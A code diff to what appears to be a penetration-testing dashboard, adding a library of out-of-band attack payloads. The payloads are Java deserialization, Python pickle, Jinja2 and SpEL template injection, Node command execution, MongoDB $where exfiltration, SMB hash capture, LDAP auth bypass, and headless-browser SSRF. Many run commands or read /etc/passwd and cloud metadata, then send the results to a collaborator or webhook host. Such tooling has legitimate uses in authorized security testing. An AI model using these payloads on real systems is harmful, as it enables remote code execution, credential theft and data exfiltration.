@@ -477,6 +477,89 @@ export default function DashboardPage({ params }) {
           tip: 'Exfiltrates internal server username through JNDI path.'
         }
       ]
+    },
+    {
+      category: 'DESER',
+      label: 'Deserialization & Template OAST',
+      items: [
+        {
+          title: 'Java JRMPClient Pingback',
+          payload: `java -jar ysoserial.jar JRMPClient ${webhookHost}:1099`,
+          tip: 'Forces JVM to initiate outbound connection to remote RMI/JRMP listener.'
+        },
+        {
+          title: 'Python Pickle OOB Callback',
+          payload: `cos\\nsystem\\n(S'curl ${activeCollabUrl}?py=pickle'\\ntR.`,
+          tip: 'Raw Python pickle opcode executing curl to listener upon unpickling.'
+        },
+        {
+          title: 'Jinja2 Python urlopen Exfiltration',
+          payload: `{{lipsum.__globals__.__builtins__.__import__('urllib.request').urlopen('${activeCollabUrl}?s=' ~ lipsum.__globals__.__builtins__.__import__('os').popen('id').read().strip())}}`,
+          tip: 'SSTI payload executing commands and sending output to collaborator URL.'
+        },
+        {
+          title: 'Spring SpEL Runtime Exec OOB',
+          payload: `\${T(java.lang.Runtime).getRuntime().exec("curl ${activeCollabUrl}?spel=1")}`,
+          tip: 'Spring Boot Expression Language injection invoking Runtime.exec.'
+        },
+        {
+          title: 'Node.js Child Process Callback',
+          payload: `require('child_process').exec('curl ${activeCollabUrl}?node=1')`,
+          tip: 'Asynchronously triggers curl via child_process.exec in Node.js.'
+        }
+      ]
+    },
+    {
+      category: 'NOSQL',
+      label: 'NoSQL & LDAP Injection',
+      items: [
+        {
+          title: 'MongoDB $where Fetch Exfil',
+          payload: `{"$where": "this.user == 'admin' && (function(){ fetch('${activeCollabUrl}?u='+this.password) })()"}`,
+          tip: 'Executes server-side JS inside Mongo $where clause to exfiltrate password.'
+        },
+        {
+          title: 'MongoDB Blind Sleep Delay',
+          payload: `{"$where": "sleep(5000)"}`,
+          tip: 'Pauses MongoDB thread for 5 seconds to verify blind injection.'
+        },
+        {
+          title: 'Active Directory SMB Hash Capture',
+          payload: `\\\\${webhookHost}\\share`,
+          tip: 'Forces domain controller to connect to listener UNC path for NetNTLM capture.'
+        },
+        {
+          title: 'LDAP Always-True Auth Bypass',
+          payload: `*)(&`,
+          tip: 'Terminates LDAP query to force authentication evaluation to true.'
+        }
+      ]
+    },
+    {
+      category: 'PDF',
+      label: 'PDF & Headless Browser SSRF',
+      items: [
+        {
+          title: 'Chromium Iframe Metadata SSRF',
+          payload: `<iframe src="http://169.254.169.254/latest/meta-data/" width="800" height="600"></iframe>`,
+          tip: 'Renders cloud metadata directly inside PDF pages in headless Chrome.'
+        },
+        {
+          title: 'Chromium Local File Read Iframe',
+          payload: `<iframe src="file:///etc/passwd" width="800" height="600"></iframe>`,
+          tip: 'Embeds /etc/passwd contents visually within rendered PDF report.'
+        },
+        {
+          title: 'Chromium XHR Exfiltration to Webhook',
+          payload: `<script>var x=new XMLHttpRequest();x.open('GET','file:///etc/passwd',false);x.send();fetch('${activeCollabUrl}?pdf='+btoa(x.responseText))</script>`,
+          tip: 'XHR synchronous read of local file transmitted out-of-band to webhook.'
+        },
+        {
+          title: 'wkhtmltopdf Meta Refresh SSRF',
+          payload: `<meta http-equiv="refresh" content="0;url=${activeCollabUrl}">`,
+          tip: 'Forces wkhtmltopdf to follow HTTP meta refresh redirect to collaborator URL.'
+        }
+      ]
     }
   ], [webhookHost, activeCollabUrl, activeCollabPath]);
 
